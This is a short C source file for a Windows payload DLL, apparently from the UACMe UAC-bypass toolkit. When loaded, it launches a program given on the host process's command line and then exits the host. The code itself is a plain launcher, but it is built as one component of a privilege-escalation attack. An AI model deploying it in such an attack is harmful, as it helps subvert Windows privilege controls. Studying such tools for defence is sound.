#include "dllmain.h"

VOID WINAPI DummyFunc(
	VOID
	)
{
}

BOOL WINAPI DllMain(
	__in  HINSTANCE hinstDLL,
	__in  DWORD fdwReason,
	__in  LPVOID lpvReserved
	)
{
	int argc = 0;
	WCHAR **argv;
	STARTUPINFOW startupInfo;
	PROCESS_INFORMATION processInfo;
	WCHAR *szCmd;
	WCHAR *szDir;
	WCHAR *szArgs;
	WCHAR DebugOutput[MAX_PATH * 2];

	switch (fdwReason) {

	case DLL_PROCESS_ATTACH:
	{
		argv = CommandLineToArgvW(GetCommandLineW(), &argc);

		wsprintfW(DebugOutput, L"[UD] UACMe payload dll");
		OutputDebugStringW(DebugOutput);

		if (argc != 4) {
			wsprintfW(DebugOutput, L"[UD] Wrong number of arguments %u", argc);
			OutputDebugStringW(DebugOutput);
		}
		else {

			szCmd = argv[1];
			szDir = argv[2];
			szArgs = argv[3];

			RtlSecureZeroMemory(&startupInfo, sizeof(STARTUPINFOW));
			RtlSecureZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));

			startupInfo.cb = sizeof(STARTUPINFOW);
			wsprintfW(DebugOutput, L"[UD] Starting %ws with args %ws and directory %ws", szCmd, szArgs, szDir);
			OutputDebugStringW(DebugOutput);

			if (CreateProcessW(szCmd, szArgs, NULL, NULL, FALSE, 0, NULL, szDir, &startupInfo, &processInfo))
			{
				CloseHandle(processInfo.hProcess);
				CloseHandle(processInfo.hThread);
			}
			ExitProcess(0);
		}
		break;
	}
	default:
		break;
	}

	return TRUE;
}